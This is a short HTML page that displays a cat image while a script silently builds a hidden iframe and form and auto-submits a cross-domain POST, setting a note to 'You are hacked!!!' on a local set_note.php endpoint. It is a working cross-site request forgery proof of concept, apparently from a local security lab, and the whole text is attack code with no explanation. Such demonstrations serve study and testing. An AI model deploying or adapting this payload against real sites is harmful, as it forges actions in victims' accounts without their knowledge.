<img src="cat.jpg">
<script>
    function crossDomainPost() {
    var iframe = document.createElement("iframe");
    var uniqueString = "SOME_UNIQUE_STRING";
    document.body.appendChild(iframe);
    iframe.style.display = "none";
    iframe.contentWindow.name = uniqueString;

    // construct a form with hidden inputs, targeting the iframe
    var form = document.createElement("form");
    form.target = uniqueString;
    form.action = "http://127.0.0.1/security/Cross-Domain_POSTs/set_note.php";
    form.method = "POST";

    // repeat for each parameter
    var input = document.createElement("input");
    input.type = "hidden";
    input.name = "note";
    input.value = "You are hacked!!!";
    form.appendChild(input);

    document.body.appendChild(form);
    form.submit();
    }
    crossDomainPost();
</script>